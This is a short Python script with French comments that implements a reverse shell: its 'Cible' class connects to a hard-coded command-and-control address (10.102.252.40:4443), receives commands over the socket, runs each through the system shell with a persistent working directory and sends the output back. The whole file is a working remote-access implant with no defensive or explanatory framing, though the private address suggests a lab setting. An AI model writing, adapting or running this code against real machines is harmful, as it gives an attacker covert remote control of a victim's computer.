import socket
import subprocess
import os

class Cible:
    def __init__(self, host='10.102.252.40', port=4443):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # cwd persistant : initialisé au cwd du process
        self.cwd = os.getcwd()

    def connect(self):
        try:
            self.socket.connect((self.host, self.port))
            print(f"[+] Connecté au C2 {self.host}:{self.port}")
            self.send("Cible connectée (cwd: {})".format(self.cwd))

            while True:
                data = self.socket.recv(4096)
                # detecte fermeture propre du serveur
                if not data:
                    print("[*] Connexion fermée par le serveur.")
                    break

                cmd = data.decode('utf-8', errors='replace').strip()
                if not cmd:
                    # commande vide : on continue
                    self.send("Aucune commande reçue.")
                    continue

                # gestion spéciale de 'exit'
                if cmd == "exit":
                    self.send("Bye.")
                    break

                # gestion spéciale de 'cd' pour que le changement persiste
                if cmd.startswith("cd"):
                    # syntaxe: cd [chemin]
                    parts = cmd.split(maxsplit=1)
                    target = parts[1] if len(parts) > 1 else os.path.expanduser("~")
                    # calculer chemin absolu selon cwd actuel si chemin relatif
                    if not os.path.isabs(target):
                        new_dir = os.path.abspath(os.path.join(self.cwd, target))
                    else:
                        new_dir = os.path.abspath(target)
                    if os.path.isdir(new_dir):
                        self.cwd = new_dir
                        self.send(f"OK: cwd -> {self.cwd}")
                    else:
                        self.send(f"Erreur: répertoire introuvable: {target}")
                    continue

                # pour toutes les autres commandes, exécuter en shell dans le cwd persistant
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=self.cwd)
                    output = result.stdout if result.stdout else result.stderr
                    if not output:
                        output = "(aucune sortie)"
                    self.send(output)
                except Exception as e:
                    self.send(f"Erreur lors de l'exécution: {e}")

        except Exception as e:
            print(f"[!] Erreur: {e}")
        finally:
            self.socket.close()

    def send(self, data):
        if data is None:
            data = ""
        try:
            # utiliser sendall pour s'assurer que tout est envoyé
            self.socket.sendall(data.encode('utf-8', errors='replace'))
        except Exception as e:
            print(f"[!] Erreur en envoyant les données: {e}")

if __name__ == "__main__":
    cible1 = Cible()
    cible1.connect()
